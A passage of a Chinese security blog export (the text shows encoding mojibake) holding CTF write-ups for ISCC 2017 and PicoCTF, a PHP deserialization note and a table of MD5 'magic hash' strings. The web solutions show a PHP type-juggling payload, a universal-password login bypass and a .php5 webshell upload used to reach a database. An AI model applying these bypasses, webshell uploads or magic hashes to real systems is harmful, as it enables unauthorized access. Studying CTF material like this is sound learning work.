<p>3.å¾ˆæ™®é€šçš„æ•°ç‹¬ï¼ˆ300ï¼‰</p>
<p>ä¸‹è½½å¾—åˆ°25ä¸ªæ•°ç‹¬å›¾ç‰‡ï¼Œæœ‰æ•°å­—çš„æ ¼æ¶‚é»‘ï¼Œæ‹¼æˆäºŒç»´ç ã€‚ï¼ˆpså¤§æ³•å¥½ï¼‰</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170520/120732519.png" alt="mark"></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170520/120748410.png" alt="mark"></p>
<p>æ‰«ç ï¼Œè§£base64ï¼Œå¾—flagã€‚</p>
<p>4.å°±åœ¨å…¶ä¸­ï¼ˆ100ï¼‰</p>
<p>wiresharkåˆ†ææ²¡ä¸œè¥¿ï¼Œè½¬è€Œå»binwalkåˆ†ç¦»æ–‡ä»¶ï¼Œåˆ†ç¦»å‡ºçš„ä¸€å †ä¸œè¥¿é‡Œåˆä¸ªå‹ç¼©åŒ…ï¼Œå¯ä»¥è§£å‹å‡ºkey.txt,ä½†æ‰“å¼€æ˜¯ä¹±ç ï¼Œæ–‡ä»¶ä¸­è¿˜æœ‰ä¸€ä¸ªrsaè§£å¯†keyï¼Œopensslå‘½ä»¤è§£å¯†å¾—flagã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170520/162146042.png" alt="mark"></p>
<p>å‘½ä»¤ï¼š</p>
<pre><code># openssl rsautl -decrypt -in &#39;/root/output/zip/00000047/key.txt&#39; -inkey &#39;/root/_Misc-03.pcapng.extracted/AC76.key&#39; -out key.de</code></pre>
<blockquote>
<p>openssl -RSAèµ„æ–™</p>
<p><a href="http://www.cnblogs.com/aLittleBitCool/archive/2011/09/22/2185418.html">http://www.cnblogs.com/aLittleBitCool/archive/2011/09/22/2185418.html</a></p>
</blockquote>
<h2 id="0X03-Web"><a href="#0X03-Web" class="headerlink" title="0X03 Web"></a>0X03 Web</h2><p>1.è‡ªç›¸çŸ›ç›¾ï¼ˆ150ï¼‰</p>
<pre><code>
æ‰“ç ´å¸¸è§„ï¼Œæ¯ä½ ä¸‰è§‚ï¼ï¼ï¼ï¼

&lt;!--
$v1=0;$v2=0;$v3=0;
$a=(array)json_decode(@$_GET[&#39;iscc&#39;]);  #jsonæ ¼å¼ä¼ å…¥æ•°æ®ï¼Œgetæ–¹å¼è¯»å…¥

if(is_array($a))&#123;
    is_numeric(@$a[&quot;bar1&quot;])?die(&quot;nope&quot;):NULL;
    if(@$a[&quot;bar1&quot;])&#123;
        ($a[&quot;bar1&quot;]&gt;2016)?$v1=1:NULL;    #isccä¸­çš„bar1ä¸èƒ½æ˜¯æ•°å­—è¿˜å¾—å¤§äº2016
    &#125;
    if(is_array(@$a[&quot;bar2&quot;]))&#123;
        if(count($a[&quot;bar2&quot;])!==5 OR !is_array($a[&quot;bar2&quot;][0])) die(&quot;nope&quot;);
            #bar2æ˜¯5ä½æ•°ç»„ä¸”ç¬¬0ä½ä¹Ÿæ˜¯æ•°ç»„
        $pos = array_search(&quot;nudt&quot;, $a[&quot;bar2&quot;]); 
        $pos===false?die(&quot;nope&quot;):NULL;   #bar2çš„æ¯ä¸€ä½è¦å«æœ‰nudt
        foreach($a[&quot;bar2&quot;] as $key=&gt;$val)&#123;
            $val===&quot;nudt&quot;?die(&quot;nope&quot;):NULL;    #bar2çš„æ¯ä¸€ä½ä¸èƒ½å«æœ‰nudt
        &#125;
        $v2=1;

    &#125;    
&#125;
$c=@$_GET[&#39;cat&#39;];
$d=@$_GET[&#39;dog&#39;];
if(@$c[1])&#123;
    if(!strcmp($c[1],$d) &amp;&amp; $c[1]!==$d)&#123;  #0&amp;&amp;1

        eregi(&quot;3|1|c&quot;,$d.$c[0])?die(&quot;nope&quot;):NULL;
        strpos(($c[0].$d), &quot;isccctf2017&quot;)?$v3=1:NULL; #è¦æœ‰isccctf2017

    &#125;

&#125;
if($v1 &amp;&amp; $v2 &amp;&amp; $v3)&#123; 

   echo $flag;
&#125;
--&gt;
</code></pre>
<p>phpçš„å¼±ç±»å‹ï¼šå½“ä¸€ä¸ªæ•´å½¢å’Œä¸€ä¸ªå…¶ä»–ç±»å‹è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå…ˆæŠŠå…¶ä»–ç±»å‹intvalå†æ¯”</p>
<p>ä¼ {â€œbar1â€:â€2017aâ€}å°±å¥½äº†ã€‚</p>
<p>intval(nudt)=0,æ‰€ä»¥{â€œbar2â€:â€[[0],0,0,0,0]â€}</p>
<p>catè¦æ˜¯æ•°ç»„ï¼Œcat[1]å’Œdogæ¯”è¾ƒï¼Œè¦strcmpä¸º0ï¼Œcat[1]!==dogä¸º1ï¼Œæ‰€ä»¥è®©cat[1]ä¸ºæ•°å­—ï¼Œdogä¸ºå­—ç¬¦ã€‚</p>
<p>dogåˆè¦åŒ…å«isccctf2017ï¼Œç”¨%00æˆªæ–­ã€‚</p>
<p>payloadï¼š<code>?iscc=&#123;&quot;bar1&quot;:&quot;2017a&quot;,&quot;bar2&quot;:[[0],0,0,0,0]&#125;&amp;cat[0]=1&amp;cat[1][]=1&amp;dog=%00isccctf2017</code></p>
<p>2.æˆ‘ä»¬ä¸€èµ·æ¥æ—¥ç«™ï¼ˆ150ï¼‰</p>
<p>çœ‹ä¸€ä¸‹/robots.txtï¼Œ</p>
<pre><code>#
# robots.txt 
#
User-agent: * 
Disallow: /21232f297a57a5a743894a0e4a801fc3/
Disallow: /api
</code></pre>
<p>å»è®¿é—®<code>http://139.129.108.53:5090/web-04/21232f297a57a5a743894a0e4a801fc3/</code>ï¼ŒçŒœæµ‹ç™»é™†é¡µé¢ä¸º<code>http://139.129.108.53:5090/web-04/21232f297a57a5a743894a0e4a801fc3/admin.php</code>.</p>
<p>æ­£ç¡®ï¼Œè¿›å…¥ç™»é™†é¡µé¢ï¼ŒæŠ“åŒ…ï¼Œä¸‡èƒ½å¯†ç ç™»é™†,å¾—åˆ°flagã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170519/210143688.png" alt="mark"></p>
<blockquote>
<p>åå°ç™»é™†ä¸‡èƒ½å¯†ç </p>
<p><a href="https://www.douban.com/note/168041331/">https://www.douban.com/note/168041331/</a></p>
</blockquote>
<p>3.äº¤æ¢flagï¼ˆ100ï¼‰</p>
<p>â€‹    æŠ“ä¸ªåŒ…ï¼Œå‚æ•°ä¼ å…¥çš„å€¼ä¸º<code>f1ag</code>,è¿™ä¸ªåœ¨é¢˜ç›®é¡µé¢ç»†å¿ƒä¸€ç‚¹å¯ä»¥å‘ç°ï¼Œå†å°±æ˜¯å‚æ•°åç§°çš„é—®é¢˜ï¼Œæ¯ä¸€æ¬¡æ ¹æ®åé¦ˆä¸æ–­æ·»åŠ å°±å¥½ã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170519/210535245.png" alt="mark"></p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170519/210642673.png" alt="mark"></p>
<p>4.WelcomeToMySQLï¼ˆ100ï¼‰</p>
<p>å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œä¸Šä¼ å›¾ç‰‡å¯ä»¥ï¼Œä¼ phpçš„é©¬å°±ä¼šå¼¹çª—ï¼Œä»è¡¨å“¥é‚£å¾—çŸ¥æœ‰.php5çš„è¿™ç§æ–‡ä»¶ï¼Œç›´æ¥å¯ä»¥ä¸Šä¼ ï¼Œä¼ é©¬ï¼Œåœ¨base.phpæ–‡ä»¶ä¸­å‘ç°usernameå’Œpasswordï¼Œç™»é™†æ•°æ®åº“ï¼Œå¾—åˆ°flagã€‚</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170520/171613094.png" alt="mark"></p>
<p>5.</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>MD5å€¼0eå¼€å¤´çš„æ•°å­—å’Œå­—æ¯å­—ç¬¦ä¸²</title>
    <url>/2017/04/29/md5-zhi-0e-kai-tou-de-shu-zi-he-zi-mu-zi-fu-chuan/</url>
    <content><![CDATA[<h1 id="MD5å€¼0eå¼€å¤´çš„æ•°å­—å’Œå­—æ¯å­—ç¬¦ä¸²"><a href="#MD5å€¼0eå¼€å¤´çš„æ•°å­—å’Œå­—æ¯å­—ç¬¦ä¸²" class="headerlink" title="MD5å€¼0eå¼€å¤´çš„æ•°å­—å’Œå­—æ¯å­—ç¬¦ä¸²"></a>MD5å€¼0eå¼€å¤´çš„æ•°å­—å’Œå­—æ¯å­—ç¬¦ä¸²</h1><p>æ•°å­—ï¼š</p>
<pre><code>240610708 0e462097431906509019562988736854
314282422 0e990995504821699494520356953734
571579406 0e972379832854295224118025748221
903251147 0e174510503823932942361353209384
1110242161 0e435874558488625891324861198103
1320830526 0e912095958985483346995414060832
1586264293 0e622743671155995737639662718498
2302756269 0e250566888497473798724426794462
2427435592 0e067696952328669732475498472343
2653531602 0e877487522341544758028810610885
3293867441 0e471001201303602543921144570260
3295421201 0e703870333002232681239618856220
3465814713 0e258631645650999664521705537122
3524854780 0e507419062489887827087815735195
3908336290 0e807624498959190415881248245271
4011627063 0e485805687034439905938362701775
4775635065 0e998212089946640967599450361168
4790555361 0e643442214660994430134492464512
5432453531 0e512318699085881630861890526097
5579679820 0e877622011730221803461740184915
5585393579 0e664357355382305805992765337023
6376552501 0e165886706997482187870215578015
7124129977 0e500007361044747804682122060876
7197546197 0e915188576072469101457315675502
7656486157 0e451569119711843337267091732412</code></pre>
<p>å­—æ¯ï¼š</p>
<pre><code>QLTHNDT 0e405967825401955372549139051580
QNKCDZO 0e830400451993494058024219903391
EEIZDOI 0e782601363539291779881938479162
TUFEPMC 0e839407194569345277863905212547
UTIPEZQ 0e382098788231234954670291303879
UYXFLOI 0e552539585246568817348686838809
IHKFRNS 0e256160682445802696926137988570
PJNPDWY 0e291529052894702774557631701704
ABJIHVY 0e755264355178451322893275696586
DQWRASX 0e742373665639232907775599582643
DYAXWCA 0e424759758842488633464374063001
GEGHBXL 0e248776895502908863709684713578
GGHMVOE 0e362766013028313274586933780773
GZECLQZ 0e537612333747236407713628225676
NWWKITQ 0e763082070976038347657360817689
NOOPCJF 0e818888003657176127862245791911
MAUXXQC 0e478478466848439040434801845361
MMHUWUV 0e701732711630150438129209816536</code></pre>
<p>æ··åˆï¼š</p>
<pre><code>s878926199a
0e545993274517709034328855841020
s155964671a
0e342768416822451524974117254469
s214587387a
0e848240448830537924465865611904
s214587387a
0e848240448830537924465865611904
s878926199a
0e545993274517709034328855841020
s1091221200a
0e940624217856561557816327384675</code></pre>
]]></content>
      <tags>
        <tag>websec</tag>
        <tag>note</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPååºåˆ—åŒ–</title>
    <url>/2017/04/16/php-fan-xu-lie-hua/</url>
    <content><![CDATA[<h1 id="PHPååºåˆ—åŒ–"><a href="#PHPååºåˆ—åŒ–" class="headerlink" title="PHPååºåˆ—åŒ–"></a>PHPååºåˆ—åŒ–</h1><p>â€‹    phpç±»å¯èƒ½ä¼šåŒ…å«ä¸€äº›ç‰¹æ®Šçš„å‡½æ•°å«magicå‡½æ•°ï¼Œmagicå‡½æ•°å‘½åæ˜¯ä»¥ç¬¦å·<code>_</code>å¼€å¤´çš„ï¼Œæ¯”å¦‚<code> __construct, __destruct, __toString, __sleep, __wakeup</code>ç­‰ç­‰ã€‚è¿™äº›å‡½æ•°åœ¨æŸäº›æƒ…å†µä¸‹ä¼šè‡ªåŠ¨è°ƒç”¨ï¼Œæ¯”å¦‚<code>__construct </code>å½“ä¸€ä¸ªå¯¹è±¡åˆ›å»ºæ—¶è¢«è°ƒç”¨ï¼Œ<code>__destruct</code>å½“ä¸€ä¸ªå¯¹è±¡é”€æ¯æ—¶è¢«è°ƒç”¨ï¼Œ<code>__toString</code>å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨ã€‚</p>
<p>â€‹    phpå…è®¸ä¿å­˜ä¸€ä¸ªå¯¹è±¡æ–¹ä¾¿ä»¥åé‡ç”¨ï¼Œè¿™ä¸ªè¿‡ç¨‹è¢«ç§°ä¸ºåºåˆ—åŒ–ã€‚php å°†æ•°æ®åºåˆ—åŒ–å’Œååºåˆ—åŒ–å…¶å®å°±ç”¨åˆ°ä¸¤ä¸ªå‡½æ•°ï¼Œserialize å’Œunserializeã€‚</p>
<p>â€‹    serialize()        æŠŠå˜é‡å’Œå®ƒä»¬çš„å€¼ç¼–ç æˆæ–‡æœ¬å½¢å¼</p>
<p>â€‹    unserialize()   æ¢å¤åŸå…ˆå˜é‡</p>
<p>ä¸€ä¸ªä¾‹å­ï¼š</p>
<pre><code>&lt;?php   
class User  
&#123;  
    public $age = 0;  
    public $name = &#39;&#39;;  
    public function PrintData()  
    &#123;  
        echo &#39;User &#39; . $this-&gt;name . &#39; is &#39; . $this-&gt;age  
             . &#39; years old. &lt;br /&gt;&#39;;  
    &#125;  
&#125;  
$usr = new User();  
$usr-&gt;age = 20;  
$usr-&gt;name = &#39;John&#39;;  
$usr-&gt;PrintData();  
echo serialize($usr);  
?&gt; </code></pre>
<p>ç»“æœæ˜¯ï¼š</p>
<pre><code>O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;i:20;s:4:&quot;name&quot;;s:4:&quot;John&quot;;&#125;</code></pre>
<p>ä¸Šé¢çš„æ˜¯åºåˆ—åŒ–åçš„ï¼ŒOè¡¨ç¤ºå¯¹è±¡ï¼Œ4è¡¨ç¤ºå¯¹è±¡åUseré•¿åº¦ï¼Œiè¡¨ç¤ºintï¼Œsæ˜¯stringã€‚</p>
<blockquote>
<ul>
<li>a - array</li>
<li>b - boolean</li>
<li>d - double</li>
<li>i - integer</li>
<li>o - common object</li>
<li>r - reference</li>
<li>s - string</li>
<li>C - custom object</li>
<li>O - class</li>
<li>N - null</li>
<li>R - pointer reference</li>
<li>U - unicode string</li>
</ul>
</blockquote>
<p>PHPååºåˆ—åŒ–æ¼æ´</p>
<blockquote>
<p>æ¼æ´çš„æ ¹æºåœ¨äºunserialize()å‡½æ•°çš„å‚æ•°å¯æ§ã€‚å¦‚æœååºåˆ—åŒ–å¯¹è±¡ä¸­å­˜åœ¨é­”æœ¯æ–¹æ³•ï¼Œè€Œä¸”é­”æœ¯æ–¹æ³•ä¸­çš„ä»£ç æœ‰èƒ½å¤Ÿè¢«æˆ‘ä»¬æ§åˆ¶ï¼Œæ¼æ´å°±è¿™æ ·äº§ç”Ÿäº†ï¼Œæ ¹æ®ä¸åŒçš„ä»£ç å¯ä»¥å¯¼è‡´å„ç§æ”»å‡»ï¼Œå¦‚ä»£ç æ³¨å…¥ã€SQLæ³¨å…¥ã€ç›®å½•éå†ç­‰ç­‰ã€‚</p>
</blockquote>
<p>å‚è€ƒèµ„æ–™ï¼ˆæŒºè¯¦ç»†ï¼‰ï¼š<a href="http://www.phpgz.com/plus/view.php?aid=131">http://www.phpgz.com/plus/view.php?aid=131</a></p>
<p>å‡ ä¸ªä¾‹é¢˜ï¼š<a href="http://www.cnblogs.com/test404/p/6486435.html">http://www.cnblogs.com/test404/p/6486435.html</a></p>
]]></content>
      <categories>
        <category>websec</category>
      </categories>
      <tags>
        <tag>websec</tag>
        <tag>PHPååºåˆ—åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>PILå®‰è£…æ‰¾ä¸åˆ°pythonè·¯å¾„é—®é¢˜</title>
    <url>/2017/08/22/pil-an-zhuang-zhao-bu-dao-python-lu-jing-wen-ti/</url>
    <content><![CDATA[<pre><code>#  
# script to register Python 2.0 or later for use with win32all  
# and other extensions that require Python registry settings  
#  
# written by Joakim Loew for Secret Labs AB / PythonWare  
#  
# source:  
# http://www.pythonware.com/products/works/articles/regpy20.htm  
#  
# modified by Valentine Gogichashvili as described in http://www.mail-archive.com/distutils-sig@python.org/msg10512.html  

import sys  

from _winreg import *  

# tweak as necessary  
version = sys.version[:3]  
installpath = sys.prefix  

regpath = &quot;SOFTWARE\\Python\\Pythoncore\\%s\\&quot; % (version)  
installkey = &quot;InstallPath&quot;  
pythonkey = &quot;PythonPath&quot;  
pythonpath = &quot;%s;%s\\Lib\\;%s\\DLLs\\&quot; % (  
    installpath, installpath, installpath  
)  

def RegisterPy():  
    try:  
        reg = OpenKey(HKEY_CURRENT_USER, regpath)  
    except EnvironmentError as e:  
        try:  
            reg = CreateKey(HKEY_CURRENT_USER, regpath)  
            SetValue(reg, installkey, REG_SZ, installpath)  
            SetValue(reg, pythonkey, REG_SZ, pythonpath)  
            CloseKey(reg)  
        except:  
            print &quot;*** Unable to register!&quot;  
            return  
        print &quot;--- Python&quot;, version, &quot;is now registered!&quot;  
        return  
    if (QueryValue(reg, installkey) == installpath and  
        QueryValue(reg, pythonkey) == pythonpath):  
        CloseKey(reg)  
        print &quot;=== Python&quot;, version, &quot;is already registered!&quot;  
        return  
    CloseKey(reg)  
    print &quot;*** Unable to register!&quot;  
    print &quot;*** You probably have another Python installation!&quot;  

if __name__ == &quot;__main__&quot;:  
    RegisterPy()  </code></pre>
<p>è¿è¡Œã€‚</p>
]]></content>
      <tags>
        <tag>other</tag>
      </tags>
  </entry>
  <entry>
    <title>PicoCTF WriteUp</title>
    <url>/2017/08/31/picoctf-writeup/</url>
    <content><![CDATA[<h1 id="PicoCTF-WriteUp"><a href="#PicoCTF-WriteUp" class="headerlink" title="PicoCTF WriteUp"></a>PicoCTF WriteUp</h1><h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="1-Internet-Kitties"><a href="#1-Internet-Kitties" class="headerlink" title="1.Internet Kitties"></a>1.Internet Kitties</h4><blockquote>
<p>I was told there was something at IP shell2017.picoctf.com with port 24369. How do I get there? Do I need a ship for the port?</p>
<p>**** HINTS</p>
<p>Look at using the netcat (nc) command!</p>
<p>To figure out how to use it, you can run â€œman ncâ€ or â€œnc -hâ€ on the shell, or search for it on the interwebz</p>
</blockquote>
<p><strong>WriteUp</strong></p>
<pre><code>nc shell2017.picoctf.com 24369</code></pre>
<p><strong>Flag</strong></p>
<pre><code>648defaaba45452729b7179f0603df05</code></pre>
<h4 id="2-Piazza"><a href="#2-Piazza" class="headerlink" title="2.Piazza"></a>2.Piazza</h4><blockquote>
<p>Have questions about pico? You can ask <a href="http://piazza.com/picoctf/spring2017/31337">here</a>. The access code is 31337.</p>
</blockquote>
<p><strong>WriteUp</strong></p>
<pre><code>æ³¨å†ŒPiazzaçš„picoCTFè¯¾ç¨‹ã€‚</code></pre>
<p><strong>Flag</strong></p>
<pre><code>flag&#123;ask_and_hop3fully_we_can_help&#125;</code></pre>
<h4 id="3-Leaf-of-the-Tree"><a href="#3-Leaf-of-the-Tree" class="headerlink" title="3.Leaf of the Tree"></a>3.Leaf of the Tree</h4><blockquote>
<p>We found this annoyingly named directory tree starting at /problems/5da315e9c7f1c9886ea371abee5ae8d0. It would be pretty lame to type out all of those directory names but maybe there is something in there worth finding? And maybe we dont need to type out all those namesâ€¦? Follow the trunk, using cat and ls!</p>
<p>**** HINTS</p>
<p>Tab completion is a wonderful, wonderful thing</p>
</blockquote>
<p><strong>WriteUp</strong></p>
<pre><code>lanvnal@shell-web:~$ cd /problems/5da315e9c7f1c9886ea371abee5ae8d0    
lanvnal@shell-web:/problems/5da315e9c7f1c9886ea371abee5ae8d0$ find | grep flag
./trunk/trunke655/trunk8845/trunk9942/trunk2d10/trunk55d8/trunke715/trunkb041/flag                lanvnal@shellweb:/problems/5da315e9c7f1c9886ea371abee5ae8d0$cat trunk/trunke655/trunk8845/trunk9942/trunk2d10/trunk55d8/trunke715/trunkb041/flag
42eed2e89ae8b05b56555f65e0ab81aa</code></pre>
<p><strong>Flag</strong></p>
<pre><code>42eed2e89ae8b05b56555f65e0ab81aa</code></pre>
<h4 id="4-looooong"><a href="#4-looooong" class="headerlink" title="4.looooong"></a>4.looooong</h4><blockquote>
<p>I heard you have some â€œdelusions of grandeurâ€ about your typing speed. How fast can you go at shell2017.picoctf.com:59858?</p>
<p>**** HINTS</p>
<p>Use the nc command to connect!</p>
<p>I hear python is a good means (among many) to generate the needed input.</p>
<p>It might help to have multiple windows open</p>
</blockquote>
<p><strong>WriteUp</strong></p>
<p>æˆ‘çš„æ–¹æ³•(æ‚è„¸</p>
<pre><code>print &quot;x&quot; * time
ç„¶åå¤åˆ¶
ï¼ˆé€ƒ</code></pre>
<p>dalaoçš„æ–¹æ³•ï¼Œpython</p>
<pre><code class="python">import re
import socket

# Open socket
s = socket.socket()
s.connect((&quot;shell2017.picoctf.com&quot;,44909))

# Receive initial instructions
instructions = s.recv(4096).decode(&quot;utf-8&quot;)
print(instructions)

# Parse instructions
letter = re.search(&quot;&#39;([A-Za-z])&#39; character&quot;, instructions).group(1)
count = int(re.search(&quot;&#39;([0-9]+)&#39; times&quot;, instructions).group(1))
end = re.search(&quot;followed by a single &#39;([a-zA-Z0-9])&#39;&quot;, instructions).group(1)

# Parse reply
reply = (letter * count) + end + &quot;\n&quot;

# Send reply
s.send(reply.encode(&quot;utf-8&quot;))

# Receive reply to reply
print(s.recv(4096).decode(&quot;utf-8&quot;))</code></pre>
<p><strong>Flag</strong></p>
<pre><code>Flag: with_some_recognition_and_training_delusions_become_glimpses_84bb3b369444af45f140fa500f5e54c3</code></pre>
<h4 id="5-Leaf-of-the-Forest"><a href="#5-Leaf-of-the-Forest" class="headerlink" title="5.Leaf of the Forest"></a>5.Leaf of the Forest</h4><blockquote>
<p>We found an even bigger directory tree hiding a flag starting at /problems/db39b5c002d8445dc6d2bbf49a8ccc37. It would be impossible to find the file named flag manuallyâ€¦</p>
<p>**** HINTS</p>
<p>Is there a search function in Linux? Like if I wanted to â€˜findâ€™ somethingâ€¦</p>
</blockquote>
<p><strong>WriteUp</strong></p>
<pre><code>lanvnal@shell-web:/problems/5da315e9c7f1c9886ea371abee5ae8d0$ cd /problems/db39b5c002d8445dc6d2bbf49a8ccc37                                 
lanvnal@shell-web:/problems/db39b5c002d8445dc6d2bbf49a8ccc37$ find | grep flag
./forest/treeada53a/trunkb393/trunkb8ea/trunka3c4/trunk639d/trunk324e/trunk0bf8/trunkf462/branchd463/flag
lanvnal@shell-web:/problems/db39b5c002d8445dc6d2bbf49a8ccc37$ cat forest/treeada53a/trunkb393/trunkb8ea/trunka3c4/trunk639d/trunk324e/trunk0bf8/trunkf462/branchd463/flag
c99501b0fe95402ed1c9191102fe1b68l</code></pre>
<p><strong>Flag</strong></p>
<pre><code>c99501b0fe95402ed1c9191102fe1b68l</code></pre>
<h4 id="6-WorldChat"><a href="#6-WorldChat" class="headerlink" title="6.WorldChat"></a>6.WorldChat</h4><blockquote>
<p>We think someone is trying to transmit a flag over WorldChat. Unfortunately, there are so many other people talking that we canâ€™t really keep track of what is going on! Go see if you can find the messenger at shell2017.picoctf.com:48145. Remember to use Ctrl-C to cut the connection if it overwhelms you!</p>
<p>**** HINTS</p>
<p>There are cool command line tools that can filter out lines with specific keywords in them. Check out â€˜grepâ€™! You can use the â€˜|â€™ character to put all the output into another process or command (like the grep process)</p>
</blockquote>
<p><strong>WriteUp</strong></p>
<pre><code>nc shell2017.picoctf.com 48145 | grep -E &quot;this is part&quot;</code></pre>
<pre><code>14:02:34 flagperson: this is part 1/8 of the flag - 748a
14:02:35 flagperson: this is part 2/8 of the flag - 3a37
14:02:37 flagperson: this is part 3/8 of the flag - ce62
14:02:38 flagperson: this is part 4/8 of the flag - e537
14:02:42 flagperson: this is part 5/8 of the flag - 4552
14:02:43 flagperson: this is part 6/8 of the flag - c31f
14:02:46 flagperson: this is part 7/8 of the flag - 5319
14:02:48 flagperson: this is part 8/8 of the flag - 30dc
14:02:49 flagperson: this is part 1/8 of the flag - 748a
14:02:50 flagperson: this is part 2/8 of the flag - 3a37
14:02:50 flagperson: this is part 3/8 of the flag - ce62
14:02:55 flagperson: this is part 4/8 of the flag - e537
14:03:02 flagperson: this is part 5/8 of the flag - 4552
14:03:14 flagperson: this is part 6/8 of the flag - c31f
14:03:20 flagperson: this is part 7/8 of the flag - 5319
14:03:26 flagperson: this is part 8/8 of the flag - 30dc
14:03:28 flagperson: this is part 1/8 of the flag - 748a
14:03:29 flagperson: this is part 2/8 of the flag - 3a37
14:03:30 flagperson: this is part 3/8 of the flag - ce62
14:03:31 flagperson: this is part 4/8 of the flag - e537
14:03:32 flagperson: this is part 5/8 of the flag - 4552</code></pre>
<p><strong>Flag</strong></p>
<pre><code>748a3a37ce62e5374552c31f531930dc</code></pre>
<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="1-What-Is-Web"><a href="#1-What-Is-Web" class="headerlink" title="1.What Is Web"></a>1.What Is Web</h4><blockquote>
<p>Someone told me that <a href="https://en.wikipedia.org/wiki/Tim_Berners-Lee">some guy</a> came up with the â€œWorld Wide Webâ€, using â€œHTMLâ€ and â€œstuffâ€. Can you help me figure out what that is? <a href="http://shell2017.picoctf.com:52334/">Website</a>.</p>
<p>**** HINTS</p>
<p>How can you figure out how the webpage is actually built?</p>
</blockquote>
<p><strong>WriteUp</strong></p>
<pre><code>æºç --&gt;
&lt;!-- The first part of the flag (there are 3 parts) is fab79c49d9e --&gt;
kacker.css--&gt;
The second part of the flag is 5ba511a0f24 
script.js--&gt;
The final part of the flag is 36308e33e85</code></pre>
<p><strong>Flag</strong></p>
<pre><code>fab79c49d9e5ba511a0f2436308e33e85</code></pre>
<h3 id="FORENSICS"><a href="#FORENSICS" class="headerlink" title="FORENSICS"></a>FORENSICS</h3><h4 id="1-Digital-Camouflage"><a href="#1-Digital-Camouflage" class="headerlink" title="1.Digital Camouflage"></a>1.Digital Camouflage</h4><blockquote>
<p>We need to gain access to some routers. Letâ€™s try and see if we can find the password in the captured network data: <a href="https://webshell2017.picoctf.com/static/24b38c9557c7c1e23957cc68bdae34ef/data.pcap">data.pcap</a>.</p>
<p>**** HINTS</p>
<p>It looks like someone logged in with their password earlier. Where would log in data be located in a network capture?</p>
<p>If you think you found the flag, but it doesnâ€™t work, consider that the data may be encrypted.</p>
</blockquote>
<p><strong>WriteUp</strong></p>
<p>Wiresharkåˆ†æï¼Œæ‰¾åˆ°æ•°æ®åŒ…#122ï¼Œmain.html</p>
<pre><code>HTML Form URL Encoded: application/x-www-form-urlencoded
    Form item: &quot;userid&quot; = &quot;spiveyp&quot;
    Form item: &quot;pswrd&quot; = &quot;S04xWjZQWFZ5OQ==&quot;</code></pre>
<p>Base64è§£ç å¾—åˆ°flagã€‚</p>
<p><strong>Flag</strong></p>
<pre><code>KN1Z6PXVy9</code></pre>
<h4 id="2-Special-Agent-User"><a href="#2-Special-Agent-User" class="headerlink" title="2.Special Agent User"></a>2.Special Agent User</h4><blockquote>
<p>We can get into the Administratorâ€™s computer with a browser exploit. But first, we need to figure out what browser theyâ€™re using. Perhaps this information is located in a network packet capture we took: <a href="https://webshell2017.picoctf.com/static/497f84833d05996a9f2b17015ed9b360/data.pcap">data.pcap</a>. Enter the browser and version as â€œBrowserName BrowserVersionâ€. NOTE: Weâ€™re just looking for up to 3 levels of subversions for the browser version (ie. Version 1.2.3 for Version 1.2.3.4) and ignore any 0th subversions (ie. 1.2 for 1.2.0)</p>
<p>** HINTS**</p>
<p>Where can we find information on the browser in networking data? Maybe try <a href="http://www.useragentstring.com./">reading up on user-agent strings</a>.</p>
</blockquote>
<p><strong>WriteUp</strong></p>
<pre><code>æ‰¾UA
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.93 Safari/537.36</code></pre>
<p><strong>Flag</strong></p>
<pre><code>Chrome 40.0.2214</code></pre>
<h3 id="CRYPTOGRAPHY"><a href="#CRYPTOGRAPHY" class="headerlink" title="CRYPTOGRAPHY"></a>CRYPTOGRAPHY</h3><h4 id="1-Keyz"><a href="#1-Keyz" class="headerlink" title="1.Keyz"></a>1.Keyz</h4><blockquote>
<p>While webshells are nice, itâ€™d be nice to be able to login directly. To do so, please add your own public key to ~/.ssh/authorized_keys, using the webshell. Make sure to copy it correctly! The key is in the ssh banner, displayed when you login remotely with ssh, to shell2017.picoctf.com</p>
<p>**** HINTS</p>
<p>There are plenty of tutorials out there. This one covers key generation: <a href="https://confluence.atlassian.com/bitbucketserver/creating-ssh-keys-776639788.html">https://confluence.atlassian.com/bitbucketserver/creating-ssh-keys-776639788.html</a></p>
<p>Then, use the web shell to copy/paste it, and use the appropriate tool to ssh to the server using your key</p>
</blockquote>
<p><strong>WriteUp</strong></p>
<p><a href="http://www.laozuo.org/2811.html">http://www.laozuo.org/2811.html</a></p>
<p><strong>Flag</strong></p>
<pre><code>who_needs_pwords_anyways</code></pre>
<h4 id="2-Substitute"><a href="#2-Substitute" class="headerlink" title="2.Substitute"></a>2.Substitute</h4><blockquote>
<p>A wizard (he seemed kinda oddâ€¦) handed me <a href="https://webshell2017.picoctf.com/static/44e178de57175cfc0e24f69d21e63f59/cipher.txt">this</a>. Can you figure out what it says?</p>
<p>**** HINTS</p>
<p>There are tools that make this easy this.</p>
</blockquote>
<p><strong>WriteUp</strong></p>
<pre><code class="php+HTML">å­—æ¯æ›¿æ¢
å·¥å…·è§£å†³ã€‚
http://quipqiup.com/</code></pre>
<p><strong>Flag</strong></p>
<pre><code>    THE FLAG IS IFONLYMODERNCRYPTOWASLIKETHIS.</code></pre>
